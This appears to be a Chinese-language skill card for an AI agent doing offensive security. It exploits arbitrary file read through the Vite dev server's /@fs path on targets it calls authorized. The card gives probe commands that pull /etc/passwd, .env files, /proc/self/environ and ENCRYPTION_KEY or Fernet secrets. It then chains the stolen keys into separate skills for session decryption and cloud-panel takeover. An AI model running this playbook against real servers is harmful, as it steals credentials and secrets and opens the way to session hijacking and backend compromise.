---
name: 快读
description: >-
 授权目标上 Vite/开发服 /@fs 绝对路径任意读：passwd、package.json、.env、
 ENCRYPTION_KEY。命中密钥后交接 fernet-session-decrypt；云控面板走 tg-cloud-panel。
---

# Vite `@fs` 任意读

**前提**：目标在 scope。这是读文件，不是 RCE。

| 档 | 成立 |
|----|------|
| L1 | `/@fs/etc/passwd` 或 `package.json` 可读 |
| L2 | `.env` / `ENCRYPTION_KEY` / Fernet 钥 |
| L3 | 解开 session 或进后端（交接，不在本卡硬解） |

```bash
python3 炼蛊房/vite_fs_probe.py -u http://IP:5173 --case <案卷>
python3 炼蛊房/vite_fs_probe.py -u http://IP:5173 --case <案卷> \
  --extra /app/backend/.env --extra /data/.env --extra /proc/self/environ
```

## 四刀

1. **认开发服** — 页含 `/@vite/client`，口常见 `:5173` `:3000` `:4173`  
2. **绝对读** — `/@fs/etc/passwd`；Windows `/@fs/C:/Windows/win.ini`  
3. **容器路径** — `/app/.env` `/src/.env` `/data/.env` `package.json` 里的 `main`  
4. **钥** — `ENCRYPTION_KEY` / `gAAAAA` → 立刻 `fernet-session-decrypt`；云控面板 → `tg-cloud-panel`

只读到 passwd **不要**写接管结案。生产 nginx 反代掉 `/@fs` 才是阴性。
真源：`传承/快读·开卷.md`
